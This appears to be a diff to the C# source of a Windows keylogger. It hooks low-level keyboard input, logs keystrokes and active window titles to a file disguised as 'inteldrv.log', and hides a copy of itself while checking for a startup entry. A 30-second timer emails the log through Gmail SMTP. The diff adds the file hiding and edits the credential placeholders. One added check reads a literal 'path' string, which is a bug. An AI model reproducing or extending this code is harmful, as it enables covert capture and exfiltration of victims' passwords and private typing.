@@ -12,12 +12,14 @@ namespace WindowsFormsApplication1
 {
     static class Program
     {
+        const string logfilename = "inteldrv.log";
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-        public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "inteldrv.log");
+        //public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), logfilename);
+        public static string path = Path.Combine(Path.GetTempPath(), logfilename);
         public static string previousWindowTitle = "";
         
         //File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
@@ -71,6 +73,7 @@ namespace WindowsFormsApplication1
             timer = new System.Timers.Timer();
             timer.Elapsed += new ElapsedEventHandler(Program.OnTimedEvent);
             timer.AutoReset = true;
+            // Current timer set to 30 sec
             timer.Interval = 30000;
             timer.Start();
 
@@ -87,11 +90,15 @@ namespace WindowsFormsApplication1
             {
                 System.IO.File.Copy(source, destination, false);
                 source = destination;
+                FileAttributes attributes = File.GetAttributes(destination);
+                File.SetAttributes(destination, File.GetAttributes(destination) | FileAttributes.Hidden);
+                Console.WriteLine("The {0} file is now hidden.", destination);
             }
             catch
             {
-                //Console.WriteLine("No authorization to copy file or other error.");
+                Console.WriteLine("No authorization to copy file or other error.");
             }
+
             //Find if the file already exist in startup
             try
             {
@@ -143,7 +150,7 @@ namespace WindowsFormsApplication1
             {
                 if (previousWindowTitle != Buff.ToString())
                 {
-                    Console.WriteLine("{" + Buff.ToString() + "}");
+                    //Console.WriteLine("{" + Buff.ToString() + "}");
                     previousWindowTitle = Buff.ToString();
                     return Buff.ToString();
                 }
@@ -155,6 +162,11 @@ namespace WindowsFormsApplication1
 
         public static void OnTimedEvent(object source, EventArgs e)
         {
+            // If there's nothing to send.... don't do it
+            if (new FileInfo("path").Length == 0)
+                return;
+
+            // THIS DOESN'T WORK - leaving here for posterity
             //Process[] ProcessList = Process.GetProcesses();
             /*             foreach (Process proc in ProcessList)
                         {
@@ -167,8 +179,8 @@ namespace WindowsFormsApplication1
             // The following gmail login attempt will be denied by default.
             // Go to security settings at the followig link https://www.google.com/settings/security/lesssecureapps and enable less secure apps
             // for email to work
-            const string emailAddress = "<insert email here>";
-            const string emailPassword = "<insert password here>";
+            const string emailAddress = "<put google username here>";
+            const string emailPassword = "<put google password here>";
             System.Net.Mail.MailMessage msg = new System.Net.Mail.MailMessage(); //create the message
             msg.To.Add(emailAddress);
             msg.From = new MailAddress(emailAddress, emailAddress, System.Text.Encoding.UTF8);
@@ -179,7 +191,8 @@ namespace WindowsFormsApplication1
             msg.BodyEncoding = System.Text.Encoding.UTF8;
             msg.IsBodyHtml = false;
             msg.Priority = MailPriority.High;
-            SmtpClient client = new SmtpClient(); //Network Credentials for Gmail            
+            SmtpClient client = new SmtpClient(); 
+            //Network Credentials for Gmail            
             client.Credentials = new System.Net.NetworkCredential(emailAddress, emailPassword);
             client.Port = 587;
             client.Host = "smtp.gmail.com";
@@ -234,9 +247,10 @@ namespace WindowsFormsApplication1
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                StreamWriter sw = File.AppendText(Program.path);
-                if (GetActiveWindowTitle() != null)
-                    Console.WriteLine(GetActiveWindowTitle());
+                string windowTitle = GetActiveWindowTitle();
+                if (windowTitle != null)
+                    Console.WriteLine("{" + windowTitle + "}");
+                StreamWriter sw = File.AppendText(Program.path);                
                 int vkCode = Marshal.ReadInt32(lParam);
                 if (Keys.Shift == Control.ModifierKeys) Program.shift = 1;
 
